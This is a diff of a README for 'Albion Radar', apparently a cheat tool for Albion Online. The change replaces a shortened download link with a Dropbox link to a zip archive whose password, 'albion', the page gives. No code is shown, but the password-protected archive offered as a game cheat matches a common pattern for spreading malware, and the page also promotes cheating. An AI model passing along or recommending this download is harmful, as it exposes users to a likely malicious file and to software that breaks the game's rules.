@@ -15,7 +15,7 @@
 <p align="center"><em>Shows the total hidden fishing points of the reservoir and visible points with fish, the number of fish in them. Fishing assistant for automatic fishing without the routine of spawning a mini-game.</em></p>
 <h2 align="center"><strong>Random Dungeons</strong></h2>
 <p align="center"><em>Shows random solo, cursed and group dungeons. Group gates of hell.</em></p>
-<p><h1 align="center"><strong><a href='https://cutt.ly/RwWsKjRh'>DOWNLOAD ALBION RADAR</a></strong></h1></p>
+<p><h1 align="center"><strong><a href='https://www.dropbox.com/scl/fi/0s9kdl9eqxg1colo9i97p/albion_radar.zip?rlkey=77a7ndr2pxg5zubwnw2qdrit4&dl=1'>DOWNLOAD ALBION RADAR</a></strong></h1></p>
 <p><h3 align="center"><strong>password is "albion"</strong></h3></p>
 <p></p><h2 style="text-align: center;"><strong>Requirements</strong></h2></p>
 <p><em>Install <a href='https://www.winpcap.org/'> Wincap</a></em></p>
